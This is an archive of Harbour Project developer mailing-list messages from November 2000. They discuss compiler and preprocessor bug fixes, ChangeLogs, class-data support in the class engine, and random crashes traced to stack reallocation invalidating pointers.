From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Mon Nov 13 15:39:02 2000
Subject: [Harbour] ChangeLog 2000-11-13 20:25 UTC+0100
In-Reply-To: <3A103FF3.6309896E@imid.med.pl>
Message-ID: <000501c04db1$7bbe67c0$0f2aa8c0@fivetechs>

Ryszard,

Many thanks!

>     *include/hbexpra.c
>     *source/compiler/expropta.c
>     *source/compiler/harbour.y
>     *source/compiler/harbour.sly
>         *fixed bug when FOR/TO/STEP (expr) is used


From harbour@lists.harbour-project.org  Mon Nov 13 18:19:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Mon Nov 13 18:19:02 2000
Subject: [Harbour] True ClassDatas and Class Methods? (JF and Antonio)
Message-ID: <001e01c04dc8$0fe46c40$0100007f@sl.conex.net>

JF,Antonio

When we will have true Class datas and Class method implemented in Harbour
Class engine.

Regards from Brazil

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Mon Nov 13 18:24:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Mon Nov 13 18:24:02 2000
Subject: [Harbour] New contrib Dir
Message-ID: <002101c04dc8$bad086c0$0100007f@sl.conex.net>

Dear Friends

Some days ago I´ve recived From Manuel Exposito an TPRN class compatible
with Harbour. I´ve done all tests , and i think that i can upload .

Coments welcome.

Regards from Brazil

Luiz Rafael Culik

Ps: If the group vote to now upload this contrib, i´ll make avaliable from
the contrib download page.


From ron@profit-master.com  Mon Nov 13 18:28:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Mon Nov 13 18:28:02 2000
Subject: [Harbour] Macro & Binding (Ryszard)
In-Reply-To: <3A0EC43A.760C6DE3@corevia.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEBIDHAA.ron@profit-master.com>

Ryszard,

Do you have any objection, that I'll post the Early/Late macro fix to Flex
build of Harbour?

If you are OK with that, should I also standardize the _GET_(...) support,
so both builds are fully functional, and Clipper compatible?

I think it will be best if we keep harbour.y and harbour.sly as synched as
possible.

Ron

> Hello,
> do you get good results with tests/tstblock.prg ? It shows allways
> "var3" here.
>
> WM_Regards,
> Jose Lalin


From ron@profit-master.com  Mon Nov 13 18:41:01 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Mon Nov 13 18:41:01 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <000001c04db0$f16cdc00$0f2aa8c0@fivetechs>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEBJDHAA.ron@profit-master.com>

Antonio, Ignacio,

Thank you so much for the input and the kind words.

Ron

> We have been testing Ron's Simplex with FWH
> and we must say it works really ok with it.
> 
> Excellent job, Ron! :-)
> 
> 
> Antonio


From harbour@lists.harbour-project.org  Mon Nov 13 19:21:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Mon Nov 13 19:21:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-13 16:18 UTC+0800
Message-ID: <000901c04dd0$98339eb0$8604d2cc@san.rr.com>

2000-11-13 16:18 UTC+0800 Brian Hays <bhays@abacuslaw.com>
   * contrib/rdd_ads/ads1.c
      + adsOrderInfo: added support for most options
   + include/ord.ch
      + 5.3-level SCOPE Commands and DBOI_* constants
   * include/hbapirdd.h
      + added note that DBOI_* constants are also in ord.ch
   * source/rdd/dbcmd.c
      * dbOrderInfo tweaks
   * include/hbrddwrk.h
      * removed stub for hb_waOrderInfo
   * source/rdd/workarea.c
      * added default hb_waOrderInfo
         Currently this throws an error if a non-supported flag is passed
         NOTE !!! -->
         Clipper behavior was just to return NIL, but that usually creates
         harder to trap errors down the road.
         I will revert this to return NIL later after testing if the group
desires

ADS dbOrderInfo Now supports:

DBOI_CONDITION
DBOI_EXPRESSION
DBOI_ISCOND
DBOI_ISDESC
DBOI_UNIQUE
DBOI_KEYTYPE
DBOI_KEYSIZE
DBOI_KEYVAL
DBOI_POSITION
DBOI_RECNO
DBOI_KEYNORAW
DBOI_NAME
DBOI_NUMBER
DBOI_BAGNAME
DBOI_BAGEXT
DBOI_ORDERCOUNT
DBOI_KEYCOUNT
DBOI_KEYCOUNTRAW
DBOI_SCOPETOP
DBOI_SCOPEBOTTOM
DBOI_SCOPETOPCLEAR
DBOI_SCOPEBOTTOMCLEAR
DBOI_SCOPETOP
DBOI_SCOPEBOTTOM
DBOI_CUSTOM
DBOI_OPTLEVEL
DBOI_AUTOOPEN


Brian Hays
Abacus Data Systems, Inc



From ron@profit-master.com  Mon Nov 13 19:25:04 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Mon Nov 13 19:25:04 2000
Subject: [Harbour] Re: bug in GET
In-Reply-To: <3A07C49B.2CF4@synel.co.il>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEBJDHAA.ron@profit-master.com>

Chen,

> with CHANGELOG 2000-11-06 22:10 UTC+0800 by Ron Pinkas
> the following anomaly exist with the GET system:
> 
> OS: Win95, Compiler: BCB3.0, Makefile: make_b32.bat and b32_slex.bat
> 
> 1. SET KEY to a function key does NOT work, SET KEY to SHIFT/CTRL/ALT
>    function key DO work (both flex and slex).

Is that something new? Did anyone look at this (David)?

> -------------------------------------------
> #include "inkey.ch"
> PROCEDURE main
> PUBLIC myGetVar := "  "
> SET KEY K_F1      TO help   // not working
> SET KEY K_F2      TO help   // not working
> SET KEY K_SH_F1   TO help   // Ok
> SET KEY K_CTRL_F1 TO help   // Ok
> SET KEY K_ALT_F1  TO help   // Ok
> CLS
> @ 10, 10 SAY "Please Press F1" GET myGetVar
> READ
> RETURN
> 
> PROCEDURE help
> ? "Called from HELP, LastKey=", LastKey()
> RETURN
> -------------------------------------------
  
>   Chen.


From ron@profit-master.com  Mon Nov 13 19:29:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Mon Nov 13 19:29:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-13 16:18 UTC+0800
In-Reply-To: <000901c04dd0$98339eb0$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEBJDHAA.ron@profit-master.com>

Brian,

Thank you!

Ron

> 2000-11-13 16:18 UTC+0800 Brian Hays <bhays@abacuslaw.com>
>    * contrib/rdd_ads/ads1.c
>       + adsOrderInfo: added support for most options
>    + include/ord.ch
>       + 5.3-level SCOPE Commands and DBOI_* constants
>    * include/hbapirdd.h
>       + added note that DBOI_* constants are also in ord.ch
>    * source/rdd/dbcmd.c
>       * dbOrderInfo tweaks
>    * include/hbrddwrk.h
>       * removed stub for hb_waOrderInfo
>    * source/rdd/workarea.c
>       * added default hb_waOrderInfo
>          Currently this throws an error if a non-supported flag is passed
>          NOTE !!! -->
>          Clipper behavior was just to return NIL, but that usually creates
>          harder to trap errors down the road.
>          I will revert this to return NIL later after testing if the group
> desires
>
> ADS dbOrderInfo Now supports:
>
> DBOI_CONDITION
> DBOI_EXPRESSION
> DBOI_ISCOND
> DBOI_ISDESC
> DBOI_UNIQUE
> DBOI_KEYTYPE
> DBOI_KEYSIZE
> DBOI_KEYVAL
> DBOI_POSITION
> DBOI_RECNO
> DBOI_KEYNORAW
> DBOI_NAME
> DBOI_NUMBER
> DBOI_BAGNAME
> DBOI_BAGEXT
> DBOI_ORDERCOUNT
> DBOI_KEYCOUNT
> DBOI_KEYCOUNTRAW
> DBOI_SCOPETOP
> DBOI_SCOPEBOTTOM
> DBOI_SCOPETOPCLEAR
> DBOI_SCOPEBOTTOMCLEAR
> DBOI_SCOPETOP
> DBOI_SCOPEBOTTOM
> DBOI_CUSTOM
> DBOI_OPTLEVEL
> DBOI_AUTOOPEN
>
>
> Brian Hays
> Abacus Data Systems, Inc


From ron@profit-master.com  Mon Nov 13 19:51:02 2000
From: ron@profit-master.com (Ron Pinkas)
Date: Mon Nov 13 19:51:02 2000
Subject: [Harbour] PP problem (Alexander)
In-Reply-To: <000901c04dd0$98339eb0$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEBKDHAA.ron@profit-master.com>

Alexander,

Pre-Processor seems to have a bug with order of nested optional clauses.

#COMMAND A [B [C] [D]] <x> => Test(<x>)

PROCEDURE Main()

   A 7       // Ok!

   A B C 7   // Ok!

   A B D 7   // Ok!

   A B C D 7 // Ok!

   A B D C 7 // Error!

RETURN

From harbour@lists.harbour-project.org  Tue Nov 14 00:31:02 2000
From: harbour@lists.harbour-project.org (Andi Jahja)
Date: Tue Nov 14 00:31:02 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <000001c04db0$f16cdc00$0f2aa8c0@fivetechs>
References: <001901c04d87$52a8ece0$0f2aa8c0@fivetechs> <000001c04db0$f16cdc00$0f2aa8c0@fivetechs>
Message-ID: <3A10CDE9280.A627ANDIJ@smtp.indosat.net.id>

Antonio Linares,

>We have been testing Ron's Simplex with FWH
>and we must say it works really ok with it.
>
>Excellent job, Ron! :-)
>
>
>Antonio

Have you rebuilt Harbour with the new/latest ppcore.c ?
The latest ppcore.c seems failed to compile any FWH prg.

Regards.

Andi Jahja

From harbour@lists.harbour-project.org  Tue Nov 14 00:47:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Tue Nov 14 00:47:01 2000
Subject: [Harbour] True ClassDatas and Class Methods? (JF and Antonio)
In-Reply-To: <001e01c04dc8$0fe46c40$0100007f@sl.conex.net>
Message-ID: <000c01c04dfe$206e37e0$0f2aa8c0@fivetechs>

Luiz,

> When we will have true Class datas and Class method implemented in Harbour
> Class engine.

We already have Class datas (what do you mean with "true" ?)

And regarding Class methods, a class object is generated when you
call its name. From that moment on, you can access its methods with
no need to create an object, i.e.:

   TClass():AMethod()

am I wrong ? (JF)

Antonio


From harbour@lists.harbour-project.org  Tue Nov 14 00:49:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Tue Nov 14 00:49:01 2000
Subject: [Harbour] Re: bug in GET
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKGEBJDHAA.ron@profit-master.com>
Message-ID: <000d01c04dfe$52f20ac0$0f2aa8c0@fivetechs>

Ron,

> > 1. SET KEY to a function key does NOT work, SET KEY to SHIFT/CTRL/ALT
> >    function key DO work (both flex and slex).
> 
> Is that something new? Did anyone look at this (David)?

I reported it to Chen long time ago...


Antonio

From harbour@lists.harbour-project.org  Tue Nov 14 00:52:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Tue Nov 14 00:52:02 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <3A10CDE9280.A627ANDIJ@smtp.indosat.net.id>
Message-ID: <000f01c04dfe$b3538100$0f2aa8c0@fivetechs>

Andi,

> Have you rebuilt Harbour with the new/latest ppcore.c ?
> The latest ppcore.c seems failed to compile any FWH prg.

ummmmm, strange...

Everything is working ok here...


Antonio

From harbour@lists.harbour-project.org  Tue Nov 14 01:52:02 2000
From: harbour@lists.harbour-project.org (Andi Jahja)
Date: Tue Nov 14 01:52:02 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <000f01c04dfe$b3538100$0f2aa8c0@fivetechs>
References: <3A10CDE9280.A627ANDIJ@smtp.indosat.net.id> <000f01c04dfe$b3538100$0f2aa8c0@fivetechs>
Message-ID: <3A10E0CDAA.71E1ANDIJ@smtp.indosat.net.id>

Antonio.

>> Have you rebuilt Harbour with the new/latest ppcore.c ?
>> The latest ppcore.c seems failed to compile any FWH prg.
>
>ummmmm, strange...
>
>Everything is working ok here...

I got the culprit now. Look at the following samples which I have a lot
in FWH prg.:

#xtranslate item1 => aitem\[1\]
#xtranslate item2 => aitem\[2\]

function main()

local aitem := { 1, 2 }
local myarr := { "One", "Two" }

? myarr[ item1 ]

return nil

It won't compile under the latest ppcore.c

Andi Jahja

From harbour@lists.harbour-project.org  Tue Nov 14 01:58:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Tue Nov 14 01:58:01 2000
Subject: [Harbour] Mailman Replyto problem
Message-ID: <3A109C25.14841.645D273@localhost>

It's fixed. I got a patch.

Thanks for being patient.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Tue Nov 14 02:03:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Tue Nov 14 02:03:02 2000
Subject: [Harbour] True ClassDatas and Class Methods? (JF and Antonio)
In-Reply-To: <001e01c04dc8$0fe46c40$0100007f@sl.conex.net>
Message-ID: <3A10F19C.11720.5C207@localhost>

Hi Luiz

> When we will have true Class datas and Class method implemented in
> Harbour Class engine.

What do you mean by 'true' ?

There is actually one (good ;-)) ) implementation of class data and 
class method. And for the class data, you can even choice it to be 
shared or non shared (across subclass).

Do you encounter some specific problem ?

See you,

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Tue Nov 14 02:07:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 14 02:07:02 2000
Subject: [Harbour] Simplex and FWH
In-Reply-To: <3A10E0CDAA.71E1ANDIJ@smtp.indosat.net.id>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEBNDHAA.ron@profit-master.com>

Andi,

Fixed! will upload in few minutes.

Ron

> Antonio.
> 
> >> Have you rebuilt Harbour with the new/latest ppcore.c ?
> >> The latest ppcore.c seems failed to compile any FWH prg.
> >
> >ummmmm, strange...
> >
> >Everything is working ok here...
> 
> I got the culprit now. Look at the following samples which I have a lot
> in FWH prg.:
> 
> #xtranslate item1 => aitem\[1\]
> #xtranslate item2 => aitem\[2\]
> 
> function main()
> 
> local aitem := { 1, 2 }
> local myarr := { "One", "Two" }
> 
> ? myarr[ item1 ]
> 
> return nil
> 
> It won't compile under the latest ppcore.c
> 
> Andi Jahja


From harbour@lists.harbour-project.org  Tue Nov 14 02:14:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Tue Nov 14 02:14:02 2000
Subject: [Harbour] True ClassDatas and Class Methods? (JF and Antonio)
In-Reply-To: <000c01c04dfe$206e37e0$0f2aa8c0@fivetechs>
References: <001e01c04dc8$0fe46c40$0100007f@sl.conex.net>
Message-ID: <3A10F3AA.15359.DC98B@localhost>

Antonio
> We already have Class datas (what do you mean with "true" ?)
> 
> And regarding Class methods, a class object is generated when you call
> its name. From that moment on, you can access its methods with no need
> to create an object, i.e.:
> 
>    TClass():AMethod()
> 
> am I wrong ? (JF)

No, but I think I just realize what mean Luiz by the word 'true'.

Regarding class(y), we could store the a method to the tclass() 
class within each class. I tryed to do so (see TObject.prg) to be 
able to implement some InitClass message but it completely broke 
the actual implementation, where we can access any class data 
without the message class (ie: MyObj:MyClassData in place of 
MyObj:Class:MyClassData).



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Tue Nov 14 02:14:18 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Tue Nov 14 02:14:18 2000
Subject: [Harbour] True ClassDatas and Class Methods? (Luiz)
In-Reply-To: <001e01c04dc8$0fe46c40$0100007f@sl.conex.net>
Message-ID: <3A10F3EF.11420.ED9AD@localhost>

Luiz

> When we will have true Class datas and Class method implemented in
> Harbour Class engine.

Please see my response to Antonio and perhaps, explain a bit 
what you are in need for.

See you,

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Tue Nov 14 04:53:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Tue Nov 14 04:53:01 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
Message-ID: <011301c04e20$e4278890$0a0ac8c8@VECWS1>

Patrick,

The "Mailing List" page of the Harbour homepage 
is still pointing to the abandoned egroups lists.

Victor Szakats



From harbour@lists.harbour-project.org  Tue Nov 14 05:35:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 14 05:35:03 2000
Subject: [Harbour] 2000-11-14 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKCEBNDHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEBODHAA.ron@profit-master.com>

2000-11-14 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * contrib/dot/pp.prg
     ! Corrected few pre-processor bugs.
     ! Corrected DOT multi-line support.
   * contrib/dot/rp_dot.ch
     + Added Clipper and Harbour support for GET

   * source/pp/ppcore.c
     ! Removed redundant line in md_strAt() which caused bug with
translating within [] bracket expressions.


From harbour@lists.harbour-project.org  Tue Nov 14 05:44:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 14 05:44:02 2000
Subject: [Harbour] 2000-11-14 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEBODHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEBODHAA.ron@profit-master.com>

Charles, Kwon,

Could you please try again, and report your results.

Ron

> Ron,
>
> I tested your pp.prg and It is great one!
>
> But I think It need some code for DOT Prompt
>
> When I run a command "CLEAR MEMORY"  and It Clear memory of even for DOT
> Umm~~ It needs some Utility codes :-))
>
>
> Best Regards,
> Charles,Kwon 

From harbour@lists.harbour-project.org  Tue Nov 14 07:43:02 2000
From: harbour@lists.harbour-project.org (Andi Jahja)
Date: Tue Nov 14 07:43:02 2000
Subject: [Harbour] 2000-11-14 02:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEBODHAA.ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEBNDHAA.ron@profit-master.com> <LOBBKAFMMFGJIKLMEPAKEEBODHAA.ron@profit-master.com>
Message-ID: <3A113338244.81A4ANDIJ@smtp.indosat.net.id>

Ron,

>   * source/pp/ppcore.c
>     ! Removed redundant line in md_strAt() which caused bug with
>translating within [] bracket expressions.

Thanks a lot.

Andi Jahja

From harbour@lists.harbour-project.org  Tue Nov 14 09:52:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 14 09:52:01 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
Message-ID: <3A115142.6634E63A@libero.it>

Hi,

I'm having problems with begin sequence / break code. It doesn't work as
it should. Please test tests/begin.prg which now doesn't end anymore (I
think it should end).

regards.


-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 14 13:18:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 14 13:18:02 2000
Subject: [Harbour] BEGIN SEQUENCE/BREAK/RECOVER... errors
In-Reply-To: <3A115142.6634E63A@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOECADHAA.ron@profit-master.com>

The END SEQUENCE of sequence 5 does _not_ reset s_lRecoverBase to 0 as it
should (no pending sequence open). Thus the last Break() on line 76 should
have found *no* s_lRecoverBase, and should have set s_uiActionRequest =
HB_QUIT_REQUESTED ,instead it sets s_uiActionRequest = HB_BREAK_REQUESTED
which than recover to the end of sequence 5.

I can't see what recent change may have affected this (Ryszard?).

Ron

> Hi,
>
> I'm having problems with begin sequence / break code. It doesn't work as
> it should. Please test tests/begin.prg which now doesn't end anymore (I
> think it should end).
>
> regards.


From harbour@lists.harbour-project.org  Tue Nov 14 16:40:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 14 16:40:04 2000
Subject: [Harbour] classes.c ... hb_parc()
References: <200011110832.JAA02468@pegasus.wanadoo.be>
Message-ID: <3A11B0F1.115A676F@libero.it>

Jean,

it dies now inside dynsym.c.231 called by classes.c.1611. 

uiLast is 305
uiMiddle is 152
szName is "TBROWSESQL"

the pointer s_pDynItems[uiMiddle].pDynSym->pSymbol->szName is invalid
and causes an exception.

This is the second strcmp() of this call to hb_dynsymfind().

hvm.c has original 100,20 values for stack management. I dont have this
exception if I increase them to 2000,100.

Maybe some pointer inside s_pDynItems suffers from the same kind of
problem we had in classes.c.

Best regards.



JF Lefebvre ha scritto:
> 
> Maurilio
> 
> As you know I can't reproduce the error here but, just to have more
> information, could you trace the pointer value (not the content, the
> pointer itself) on the first hb_parc(1) call and from the second. It
> could be interesting to know if the pointer changed or no.
> 
> TIA
> 
> > Jean,
> >
> > as usual :-|
> >
> > Exception c0000005 at address 1915d
> > Called from TCLASS:CREATE(166)
> > Called from TSCEGLIQUERY(19)
> > Called from TSQLEDITOR:SELEZIONAQUERY(144)
> > Called from TSQLEDITOR:KEYBOARDHOOK(113)
> > Called from TSQLEDITOR:EDIT(896)
> > Called from MAIN(64)
> >
> > Process terminated by SIGSEGV
> > core dumped
> > SYS1808:
> > Il processo è terminato. Il codice per la diagnostica
> > software (codice dell'errore) è  0005.
> >
> > regards.
> >
> >
> > JF Lefebvre ha scritto:
> > >
> > > Victor,
> > >
> > > > > I should have read the function hb_parc() before to respond to your
> > > > > mail :-(((
> > > > >
> > > > > It seem it simply return a pointer to the stack, not a copy !!!!!!
> > > > > So you are rigth, it must change after a realloc.
> > > >
> > > > hb_parc() is returning a pointer to the string area itself, not to the
> > > > item, currently it's safe to use the pointer as long as the item
> > > > exists at all, and as long as we don't want to write to this memory
> > > > (except when ISBYREF() is TRUE).
> > >
> > > Ok, but in all case, the pointer is changing after a stack realloc ...
> > > So the last question now is ... why ?
> > >
> > > I'm waiting Maurillio test before to continue to investigate (For an
> > > undefined reason, I can't reproduce the error here :-((() just to see if
> > > the fact to call hb_parc(1) one more time after the stack realloc will
> > > give me a good pointer.
> > >

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 15 02:02:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 15 02:02:02 2000
Subject: [Harbour] True ClassDatas and Class Methods?
In-Reply-To: <000201c04ea2$e182fb60$0100007f@sl.conex.net>
Message-ID: <3A12423E.27949.51482@localhost>

Hi Luiz,

> > Regarding class(y), we could store the a method to the tclass()
> > class within each class. I tryed to do so (see TObject.prg) to be
> > able to implement some InitClass message but it completely broke the
> > actual implementation, where we can access any class data without
> > the message class (ie: MyObj:MyClassData in place of
> > MyObj:Class:MyClassData).
> 
> Finally , some got the clue.
> I was really talking about this feature that is present in Class(y)
> Most of my class(y) classes use the class var or class method command.

I'm currently working on a solution, I just need more time I could 
ever find. (Same for everyone here I suppose :-( )

See you, 

Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Wed Nov 15 02:47:01 2000
From: harbour@lists.harbour-project.org (Chen Kedem)
Date: Wed Nov 15 02:47:01 2000
Subject: [Harbour] Re: bug in GET
References: <200011140551.HAA21459@post-office.synel>
Message-ID: <3A123F0C.1A7F@synel.co.il>

>> 1. SET KEY to a function key does NOT work...
>
> Is that something new? Did anyone look at this (David)?

with CHANGELOG 2000-11-14 16:10 UTC-0400 by David G. Holm
it does work as expected, thanks David.

  chen.

From harbour@lists.harbour-project.org  Wed Nov 15 03:05:03 2000
From: harbour@lists.harbour-project.org (Chen Kedem)
Date: Wed Nov 15 03:05:03 2000
Subject: [Harbour] bug in F1 default behaviour
Message-ID: <3A12433E.5751@synel.co.il>

F1 is set by default to function called 'help',
Harbour fail to pass PROCNAME(), PROCLINE(), READVAR()
when the default setting is used, it is Ok when I manually
SET KEY K_F1 to help. 

Harbour show: NIL NIL NIL
Clipper show: MAIN       7 MYGETVAR

---------------------------------
#include "inkey.ch"
PROCEDURE main
PUBLIC myGetVar := "  "
//SET KEY K_F1  TO help     // <-- NOTE: remarked for default setting
CLS
@ 10, 10 SAY "Please Press F1" GET myGetVar
READ
RETURN

PROCEDURE help
PARAMETERS cProc, nLine, cVar
? cProc, nLine, cVar
RETURN
---------------------------------

  Chen.

From harbour@lists.harbour-project.org  Wed Nov 15 03:18:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 15 03:18:01 2000
Subject: [Harbour] i got some problem in ssh and cvs
In-Reply-To: <200011142120.eAELKtE30792@thor.parrett.net>
Message-ID: <002701c04edc$37972d80$0f2aa8c0@fivetechs>

David,

I gave him read/write access to CVS.

Antonio

> You don't have read/write access to CVS, so you need to access the CVS
> anonymously.


From harbour@lists.harbour-project.org  Wed Nov 15 14:36:01 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Wed Nov 15 14:36:01 2000
Subject: [Harbour] True ClassDatas and Class Methods?
References: <3A12423E.27949.51482@localhost>
Message-ID: <000f01c04f3b$3b04a9c0$0100007f@sl.conex.net>

JF
> 
> I'm currently working on a solution, I just need more time I could 
> ever find. (Same for everyone here I suppose :-( )

I have an small ideia that probaly can work. i can send to you if you want.

Regards

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Wed Nov 15 16:01:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Wed Nov 15 16:01:02 2000
Subject: [Harbour] True ClassDatas and Class Methods?
In-Reply-To: <000f01c04f3b$3b04a9c0$0100007f@sl.conex.net>
Message-ID: <200011152100.WAA24840@pyxis.wanadoo.be>

Hi Luiz

Any idea will be welcome :-))), so feel free to send what you have, 
thanks.

> JF
> > 
> > I'm currently working on a solution, I just need more time I could ever
> > find. (Same for everyone here I suppose :-( )
> 
> I have an small ideia that probaly can work. i can send to you if you
> want.
> 
> Regards
> 
> Luiz Rafael Culik
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Wed Nov 15 22:13:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Wed Nov 15 22:13:02 2000
Subject: [Harbour] Random gpfs
Message-ID: <000b01c04f7b$075d4a60$8604d2cc@san.rr.com>

As our FWH app grows, we get more and more weird random blow-ups.  The
reported address is usually meaningless, and we can often get it to go away
temporarily by adding more code or re-arranging the link script.
Any ideas how to determine what is whacking memory?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Wed Nov 15 22:53:03 2000
From: harbour@lists.harbour-project.org (Charles Kwon ( Kwon,Oh-Jun))
Date: Wed Nov 15 22:53:03 2000
Subject: [Harbour] Random gpfs
References: <000b01c04f7b$075d4a60$8604d2cc@san.rr.com>
Message-ID: <000b01c04f82$455deca0$0200a8c0@ns>

TWUgdG9vLA0KVW1tfn4gSSBnb3QgcmFuZG9tIGdwZnMgd2hlbiBFbmRpbmcgb2YgdGltZQ0KDQpC
ZXN0IFJlZ2FyZHMsDQpDaGFybGVzLEt3b24gDQoNCg==


From harbour@lists.harbour-project.org  Wed Nov 15 22:59:02 2000
From: harbour@lists.harbour-project.org (Sid Saylors)
Date: Wed Nov 15 22:59:02 2000
Subject: [Harbour] Random gpfs
References: <000b01c04f7b$075d4a60$8604d2cc@san.rr.com> <000b01c04f82$455deca0$0200a8c0@ns>
Message-ID: <3A135B5C.4E0DCBF7@home.com>

Charles,

	The latest fwh from antonio stoped that problem here , but as
the app. gets larger others pop up...

	we may have a problem with memory handling<i hope not>

Sid....



"Charles Kwon ( Kwon,Oh-Jun)" wrote:
> 
> Me too,
> Umm~~ I got random gpfs when Ending of time
> 
> Best Regards,
> Charles,Kwon
> 
> ªÛ¢êæj)b      b²ÑÚ­º.®X¬¶ÈZ­º.®èç-¢¸!¶Úÿ0«kb²×(ùYùb²Ø§~áj¶èº´ájy2¢çè®«¶'"¥«b§Nj¶èº³ë¢7´¬º·­¡È^rHm¶ÿÃj¶èº³ë¢7¶à

From harbour@lists.harbour-project.org  Thu Nov 16 04:54:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Thu Nov 16 04:54:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <000b01c04f7b$075d4a60$8604d2cc@san.rr.com>
Message-ID: <3A13BCBA.27761.48CA20@localhost>

Hi Brian, Sid, Charles, Maurillio and all other,

Having tracked (with Maurillio) the classes.c problem wich is now 
solved (for classes.c), we discovered there is a way where the 
symbol table could contain some invalid pointer. I don't have (yet) 
learned how those pointers are added/suppressed to/from the 
symbol table but I suspect there is a problem there. This problem 
seem related to the stack reallocation so it must exist somewhere 
a problem like the one we where having within classes.c.

The problem is simple, within some c function, we can't use any 
stackPush() call without taking the risk the stack could be 
reallocated and so the actual pointer obtained by HB_Param() 
coudl be invalid. The problem could be more complex if we don't 
directly call stackPuch() but some other c function (wich in turn 
could also call another c and so on ...) wich call StackPush().

One way to avoid that is to use hb_param() only when we absolutly 
need an Item pointer (Object or array for example) and only when 
we need it (ie: not when declaring the PHB_ITEM, but just before to 
use it to avoid storing a pointer wich could became invalid).   

The problem is that many 3rd party product could use hb_param() 
being certain the pointer will not move and then ...

Perhaps we should have some reflexion here about this potential 
problem. Knowing the stack behaviour, I prefer to have a dynamic 
stack but then we have to clearly annouce this potential problem to 
any developer wich would like to reuse some clipper code.

In all case, we must at least reread all the code we each have 
writen to check this possibility.

{
 PHB_ITEM pMyItem = hb_param(1) ;

 SomeCalltootherfunc(); /* wich could call StackPush() */
  
